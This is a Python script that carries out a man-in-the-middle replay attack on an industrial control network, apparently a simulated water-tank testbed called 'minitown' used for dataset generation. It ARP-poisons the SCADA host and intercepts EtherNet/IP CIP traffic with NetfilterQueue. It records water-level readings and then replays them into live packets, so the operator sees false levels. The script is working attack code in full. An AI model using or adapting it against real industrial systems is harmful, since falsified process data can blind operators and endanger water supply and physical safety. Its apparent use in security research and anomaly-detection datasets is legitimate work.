import cip
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from scapy.all import Ether
from scapy.all import *
import sys
import os
import time

from ips import minitown_ips

import sqlite3

import networker
import convertions

conn = sqlite3.connect('../../ICS_topologies/minitown_topology_dataset_generation/minitown_db.sqlite')
c = conn.cursor()

enip_port = 44818
sniffed_packet = []

sniff_counter = 0

sniff_phase = True
tracking_phase = False
replay_phase = False

nfqueue = NetfilterQueue()

track_threshold = 0.5

def sniff(pkt):
    raw = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
    float_value = convertions.translate_load_to_float(raw)
    print("In sniff------------")
    sniffed_packet.append(float_value)
    c.execute("UPDATE minitown SET value = 1 WHERE name = 'ATT_1'")
    conn.commit()

    global sniff_counter
    sniff_counter += 1
    if sniff_counter >= 100:

        print("Sniffing phase finished")

        global sniff_counter
        sniff_counter = 0

        global sniff_phase
        sniff_phase = False

        global tracking_phase
        tracking_phase = True

def replay(raw):
    print ("Replaying-----------")
    fake_value = sniffed_packet[sniff_counter]

    global sniff_counter
    sniff_counter += 1

    if sniff_counter >= len(sniffed_packet):
        global replay_phase
        replay_phase = False

    c.execute("UPDATE minitown SET value = 3 WHERE name = 'ATT_1'")
    conn.commit()
    pay = convertions.translate_float_to_load(fake_value, raw[0], raw[1])
    return pay

def capture(packet):

    # We are forced to use this weird global variables, because we are a little unsure about how the capture method of netfilterqueue works.

    pkt = IP(packet.get_payload())
    if len(pkt) == 102:

        # Maybe this should be a switch, con enum(?) for the phase names
        if sniff_phase:
            sniff(pkt)

        elif tracking_phase:
            print("Tracking...")

            raw_t = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
            float_value = convertions.translate_load_to_float(raw_t)
            print("sniffed 0 is: " + str(sniffed_packet[0]))
            print("current now is: " + str(float_value))
            if abs( float(float_value) - float(sniffed_packet[0]) ) <= track_threshold and float(float_value) < 0.5:
                print("Starting replay phase")

                global tracking_phase
                tracking_phase = False

                global replay_phase
                replay_phase = True

                global sniff_counter
                sniff_counter = 0

        elif replay_phase:
            raw_r = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
            pay_r = replay(raw_r)
            pkt[Raw].load = pay_r  # This is an IP packet
            del pkt[TCP].chksum    # Needed to recalculate the checksum
            packet.set_payload(str(pkt))

        else:
            setdown()

    packet.accept()

def setdown():
    networker.setdown_netfilterqueue(enip_port)
    nfqueue.unbind()
    print("[*] Finished phase 1 of MiTM Attack")
    c.execute("UPDATE minitown SET value = 0 WHERE name = 'ATT_1'")
    conn.commit()

def setup():
    networker.configure_routing('192.168.2.254', 'attacker2-eth0')
    networker.start_forwarding()

def launch_mitm():
    networker.setup_netfilterqueue(enip_port)

    targetip = minitown_ips['scada']
    sourceip = '192.168.2.254'

    networker.launch_arp_poison(sourceip, targetip)
    nfqueue.bind(0, capture)
    try:
        print("[*] Starting water level spoofing")
        nfqueue.run()
    except KeyboardInterrupt:
        print("[*] Interrupted attack process")
        finish()
    return 0

def finish():
    networker.setdown_netfilterqueue(enip_port)
    sys.exit(0)

if __name__ == '__main__':

    setup()

    sleep_count = 0
    sleep_limit = 102 # 75 seconds is iteratin in 128 in physical process. We want to be in 174
    #sleep_limit = 5  # For debug only
    print('[] Preparing attack')
    while sleep_count < sleep_limit:
        sleep_count += 1
        time.sleep(1)
    print('[*] Attack launched')
    launch_mitm()
